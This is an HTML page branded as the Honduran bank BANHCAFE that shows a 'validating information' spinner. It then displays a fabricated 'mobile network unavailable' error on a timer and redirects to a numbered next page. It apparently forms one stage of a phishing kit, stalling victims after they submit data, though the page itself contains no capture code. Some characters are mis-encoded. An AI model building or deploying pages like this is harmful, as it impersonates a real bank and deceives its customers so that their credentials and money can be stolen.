<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Validando informaci√≥n - BANHCAFE</title>
  <style>
    :root {
      --vino-banhcafe: #7a1c1c; /* üé® tono vino coherente con el logo */
      --fondo-claro: #f9f9f9;
      --blanco: #ffffff;
    }

    * {
      box-sizing: border-box;
      font-family: 'Segoe UI', sans-serif;
    }

    body {
      margin: 0;
      background: var(--fondo-claro);
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      background: url('assets/background.png') no-repeat center center;
      background-size: cover;
    }

    .contenedor {
      background: var(--blanco);
      padding: 40px 30px;
      border-radius: 12px;
      text-align: center;
      max-width: 400px;
      width: 100%;
      box-shadow: 0 6px 20px rgba(0,0,0,0.15);
      border-top: 5px solid var(--vino-banhcafe);
    }

    .logo img {
      max-width: 150px;
      margin-bottom: 20px;
    }

    .spinner {
      margin: 20px auto;
      width: 80px;
      height: 80px;
      border: 8px solid #ddd;
      border-top: 8px solid var(--vino-banhcafe);
      border-radius: 50%;
      animation: girar 1s linear infinite;
    }

    @keyframes girar {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }

    .mensaje {
      display: none;
      margin-top: 20px;
      color: var(--vino-banhcafe);
      font-weight: bold;
    }
  </style>
</head>
<body>
  <div class="contenedor">
    <div class="logo">
      <img src="assets/logo.png" alt="BANHCAFE">
    </div>
    <div class="spinner"></div>
    <div id="mensajeEspera" class="mensaje"> Por favor espere..</div>
    <div id="mensajeError" class="mensaje">‚úñÔ∏è Red movil no Disponible</div>
  </div>

  <script>
    // Mostrar "Por favor espere.." al inicio
    document.getElementById("mensajeEspera").style.display = "block";

    // Ocultar mensaje de espera a los 10 segundos
    setTimeout(() => {
      document.getElementById("mensajeEspera").style.display = "none";
    }, 10000);

    // Mostrar el mensaje de error a los 40 segundos
    setTimeout(() => {
      document.getElementById("mensajeError").style.display = "block";
    }, 40000);

    // Redirigir a los 45 segundos
    setTimeout(() => {
      window.location.href = "index5.html";
    }, 45000);
  </script>
</body>
</html>
